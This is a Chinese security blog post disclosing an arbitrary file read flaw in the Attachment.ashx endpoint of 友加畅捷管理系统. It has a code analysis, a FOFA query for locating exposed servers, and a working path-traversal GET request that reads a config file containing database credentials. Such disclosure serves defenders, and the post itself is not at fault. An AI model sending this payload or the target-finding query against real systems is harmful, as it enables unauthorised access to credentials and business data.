---
title: "友加畅捷管理系统 Attachment.ashx 任意文件读取漏洞"
source: https://mrxn.net/jswz/youjiasoft-Attachment-file-read.html
asset_dir: assets/友加畅捷管理系统-attachment.ashx-任意文件读取漏洞
---

# 友加畅捷管理系统 Attachment.ashx 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/11/25 08:36
* 487浏览
* [0评论](#comment)
* 8分钟阅读

深入探索

服务器

电子邮件

授权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

友加畅捷管理系统是一款专为小微商贸流通企业设计的财务业务一体化管理软件，涵盖进销存、财务、分销及移动管理等多个模块，旨在帮助企业实现高效的业务运营和财务核算。

漏洞扫描服务

该系统的 `Attachment.ashx` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。攻击者可利用此漏洞，未经授权地读取服务器上的任意文件，包括但不限于系统配置文件和数据库配置文件等敏感信息。 成功利用此漏洞可能导致企业内部敏感数据泄露，对系统的机密性和完整性构成潜在威胁。

# 影响版本

13.7004.1053.1000

# fofa语法

> icon\_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="

# 漏洞分析

深入探索

SQL

数据库

软件

直接查看 `/Controllers/ajax/Attachment.ashx` 文件的代码引用

物流软件安全

```
<%@ WebHandler Language="C#" CodeBehind="Attachment.ashx.cs" Class="CnSub.Web.Controllers.Attachment" %>
```

直接在 `bin` 目录下反编译 `CnSub.Web.dll` 获取 **Controllers.ajax.Attachment** 处理逻辑

[![友加畅捷管理系统 Attachment.ashx 任意文件读取漏洞](images/img-001-5c479143efdc.webp)](https://image.mrxn.net/542753e203504927940731a3ab470a7e.webp)

GET请求参数 `attachmentUrl` 被直接拼接在网站**upfile/[Email](#)/**目录下，然后带入 `new FileStream` 方法进行操作，期间无任何过滤或校验，因此造成任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

深入探索

漏洞预警服务

网络安全课程

Web安全课程

# 漏洞复现

```
GET /Controllers/ajax/Attachment.ashx?attachmentUrl=../../config/sysconfig_zts.fig HTTP/1.1
Host: youjiasoft.mrxn.net
```

[![友加畅捷管理系统 Attachment.ashx 任意文件读取漏洞](images/img-002-685286d25667.webp)](https://image.mrxn.net/54fa536fb31840cd9e7f96f751b3da49.webp)

成功读取到 `config/sysconfig_zts.fig` 文件内容，其中包含数据库连接信息。

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[友加畅捷管理系统 Attachment.ashx 任意文件读取漏洞](https://mrxn.net/jswz/youjiasoft-Attachment-file-read.html)  
文章链接：<https://mrxn.net/jswz/youjiasoft-Attachment-file-read.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/youjiasoft-Attachment-file-read.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/youjiasoft-Attachment-file-read.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 